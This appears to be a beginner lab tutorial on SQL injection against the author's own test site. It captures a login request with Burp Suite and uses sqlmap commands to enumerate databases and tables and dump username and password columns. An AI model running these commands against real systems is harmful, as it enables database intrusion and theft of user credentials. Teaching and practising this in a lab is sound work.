# SQl INJECTION  USING Sqlmap tool
Using SQLMAP tool and Burp suite we are going to attack and retreat data from our created website(http://webapp.host/index.php)

Check for SQL Vulnerablity in targeted website if yes then proceed with following process

use simple payloads to make sure site is vulnerable.


Step 1.

Open Browser and take your targeted website and give some random username and password and wait to hit login

![image](/screenshots/Browser1.png)

Step 2.
when i click the submit button just i did capture the requst with Burpsuit feature

Step 3.
After capture the request, just save the result into a test file

Step 4.
Now,just open the terminal and run the SQlmap tool by using this command

![image](/screenshots/sqlinjectionnadhu.png)

sqlmap -r rox.rq http://webapp.host/index.php --dbs

Here, rox.rq = saved filename from Brupsuit

Step 5.
First you just observe, will get somany request and finally you will get Databases list,which is stored in target website

![image](/screenshots/14.png)

I got databases list:
1. information_schema
2. login

Step 6.
Now you can collect the tables list which is stored in databases by using this command
sqlmap -r rox.rq http://webapp.host/index.php -D login --tables
(you can observe the result in above screenshot)

Step 7.
Wow you got tables,now you need tables right. For that
sqlmap -r rox.rq http://webapp.host/index.php -D login -T users --columns

![image](/screenshots/16.png)

Step 8.
Now you can get the list of columns,
if you want to read the columns,you have to use this command
sqlmap -r rox.rq http://webapp.host/index.php -D login -T users -C id,password,username --dump

![image](/screenshots/17.png)

![image](/screenshots/18.png)


Now you can observe the output of the cammand at above image, you will get the total information of id,password,usernames.










